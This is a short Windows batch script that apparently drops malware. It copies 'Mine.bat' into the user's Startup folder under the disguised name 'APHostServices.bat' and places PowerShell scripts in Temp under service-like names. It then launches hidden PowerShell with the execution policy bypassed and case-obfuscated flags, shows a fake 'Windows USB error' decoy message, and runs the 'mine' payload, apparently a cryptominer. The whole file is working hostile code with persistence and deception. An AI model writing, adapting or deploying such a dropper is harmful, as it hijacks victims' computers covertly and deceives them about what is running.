Copy "%CD%\Mine.bat" "C:%homepath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\APHostServices.bat"
Copy "%CD%\Mine.ps1" "C:%homepath%\AppData\Local\Temp\APHostServices.ps1"
Copy "%CD%\AggregatorHost.ps1" "C:%homepath%\AppData\Local\Temp\AggreatorHost.ps1" 
Powershell.exe -ExeCUtIonPoLiCy ByPaSs -WInDoWSTyLe hIdDeN -NolOGo -NOnIntERaCtiVe -Command "Add-Type -AssemblyName PresentationCore,PresentationFramework ;$msgBody = 'Windows USB error'; $msgTitle = 'USB error 0xf34fa'; $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle)"
mine.bat